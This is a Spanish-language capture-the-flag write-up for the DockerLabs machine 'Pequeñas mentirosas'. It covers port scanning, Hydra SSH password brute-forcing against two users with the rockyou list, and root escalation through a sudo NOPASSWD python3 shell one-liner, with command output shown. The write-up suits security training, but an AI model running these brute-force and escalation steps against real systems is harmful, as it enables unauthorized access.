# 🖥️ Writeup - Pequeñas mentirosas 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip pequenas-mentirosas.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh pequenas-mentirosas.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 16:46 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
```

Tenemos abiertos los puertos `22` y `80`.

Accedemos por `HTTP` y nos encontramos con el siguiente mensaje.

```
Pista: Encuentra la clave para A en los archivos.
```

Realizamos `fuzzing` de directorios para intentar descubrir directorios o archivos ocultos, pero no obtenemos ningún resultado.

Buscando por internet, descubrimos que `A` es un personaje de la serie `Pequeñas Mentirosas`, por lo que podría ser un usuario del sistema.

# FUERZA BRUTA

Intentamos un ataque de fuerza bruta con `Hydra` sobre el puerto `22` (`SSH`).

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-12 16:52:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
```

Encontramos credenciales para el usuario `a` : `secret`.

Accedemos por SSH.

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

Pero no encontramos ninguna vía de escalada.

Posteriormente, detectamos que existe otro usuario llamado `spencer`, así que lanzamos un ataque de `fuerza bruta` con este usuario.

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-12 16:59:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
```

Una vez autenticados como `spencer`, comprobamos permisos `sudo`, `SUID` y `Capabilities`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for spencer on a2cca82350e8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on a2cca82350e8:
    (ALL) NOPASSWD: /usr/bin/python3
```

Verificamos que podemos ejecutar el binario `python3` con privilegios de `root`, lo cual aprovechamos para escalar al de la siguiente manera:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

Info:
```
# whoami
root
# 
```

Ya somos root!